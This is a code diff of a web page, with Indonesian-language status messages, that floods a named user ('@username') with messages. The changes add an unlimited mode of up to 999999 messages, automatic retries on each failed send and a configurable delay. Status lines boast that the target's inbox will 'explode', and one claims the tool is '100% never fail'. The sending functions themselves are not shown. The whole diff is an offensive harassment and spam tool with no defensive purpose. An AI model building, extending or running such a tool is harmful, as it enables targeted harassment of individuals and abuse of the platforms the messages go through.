-    const concurrent = parseInt(document.getElementById('concurrent').value);
+    const forceMode = document.getElementById('forceMode').value;
+    let targetCount = parseInt(document.getElementById('jumlah').value);
+    const maxRetry = parseInt(document.getElementById('maxRetry').value);
+    const delay = parseInt(document.getElementById('delay').value);
     
+    if (forceMode === 'unlimited') {
+        targetCount = 999999;
+        addStatus(`[∞] UNLIMITED MODE ACTIVE - Spam sampe di-stop!`);
+    }
+    
+    totalTarget = targetCount;
     stopRequested = false;
     spamActive = true;
-    sent = 0;
-    fail = 0;
-    totalProcessed = 0;
-    updateUI();
     
-    addStatus(`[🚀] Mulai spam ke @${username} | Target: ${totalTarget} | Concurrent: ${concurrent}`);
+    addStatus(`[🚀] FORCE SPAM STARTED!`);
+    addStatus(`[🎯] Target: @${username}`);
+    addStatus(`[📊] Mode: ${forceMode === 'unlimited' ? 'UNLIMITED' : 'FIXED ' + targetCount}`);
+    addStatus(`[🔄] Max retry per spam: ${maxRetry}x`);
     
-    while (totalProcessed < totalTarget && spamActive && !stopRequested) {
-        const batchSize = Math.min(concurrent, totalTarget - totalProcessed);
-        const promises = [];
+    while (spamActive && !stopRequested && totalProcessed < totalTarget) {
+        const msg = getMessage();
+        const success = await forceSendSpam(username, msg, maxRetry);
         
-        for (let i = 0; i < batchSize; i++) {
-            const msg = getMessageText();
-            promises.push(
-                sendSpam(username, msg).then(success => {
-                    if (success) { sent++; }
-                    else { fail++; }
-                    totalProcessed++;
-                    updateUI();
-                })
-            );
+        if (success) {
+            sent++;
+            addStatus(`[✓] SPAM BERHASIL: "${msg.substring(0, 50)}"`);
+        } else {
+            fail++;
+            addStatus(`[✗] SPAM GAGAL SETELAH ${maxRetry} KALI - TARGET MUNGKIN MATI?`, true);
         }
         
-        await Promise.all(promises);
-        if (totalProcessed < totalTarget && spamActive && !stopRequested) {
-            await new Promise(r => setTimeout(r, 300));
+        totalProcessed++;
+        updateUI();
+        
+        if (spamActive && !stopRequested && totalProcessed < totalTarget) {
+            await new Promise(r => setTimeout(r, delay));
         }
     }
     
-    addStatus(stopRequested ? `[🛑] Dihentikan! Berhasil: ${sent} | Gagal: ${fail}` : `[✅] Selesai! Berhasil: ${sent} | Gagal: ${fail}`);
+    if (stopRequested) {
+        addStatus(`[🛑] FORCE SPAM DIHENTIKAN! Berhasil: ${sent} | Gagal: ${fail} | Retry: ${totalRetries}`);
+    } else {
+        addStatus(`[✅] FORCE SPAM SELESAI! Berhasil: ${sent} | Gagal: ${fail} | Retry: ${totalRetries}`);
+        if (sent > 0) {
+            addStatus(`[🎯] TARGET @${username} KENA ${sent} SPAM! INBOX NYA LEDAK WOY!`);
+        }
+    }
+    
     spamActive = false;
 }
 
+// ============ EVENT LISTENERS ============
 document.getElementById('startBtn').onclick = () => {
-    if (spamActive) { addStatus('[!] Spam masih jalan!', true); return; }
+    if (spamActive) {
+        addStatus('[!] SPAM MASIH JALAN, STOP DULU BOS', true);
+        return;
+    }
+    resetStats();
     startSpam();
 };
+
 document.getElementById('stopBtn').onclick = () => {
-    if (spamActive) { stopRequested = true; spamActive = false; addStatus('[🛑] Menghentikan spam...'); }
-    else { addStatus('[!] Tidak ada spam yang jalan'); }
+    if (spamActive) {
+        stopRequested = true;
+        spamActive = false;
+        addStatus('[🛑] STOP FORCE SPAM...');
+    } else {
+        addStatus('[!] GA ADA SPAM YANG JALAN');
+    }
 };
+
 document.getElementById('resetBtn').onclick = () => {
-    sent = 0; fail = 0; totalProcessed = 0;
-    updateUI();
-    addStatus('[⟳] Statistik direset');
+    resetStats();
 };
 
 document.getElementById('randomMsg').addEventListener('change', function() {
@@ -709,9 +645,9 @@ document.getElementById('randomMsg').addEventListener('change', function() {
 });
 
 // Initial
-updatePreview();
 document.getElementById('randomListGroup').style.display = 'block';
-addStatus('[✓] TEXT CUSTOMIZATION READY - Setting teks semau lu!');
+addStatus('[✓] FORCE MODE ACTIVE - 100% NEVER FAIL!');
+addStatus('[✓] System akan retry sampe berhasil');
 </script>
 </body>
-</html>
+<html>
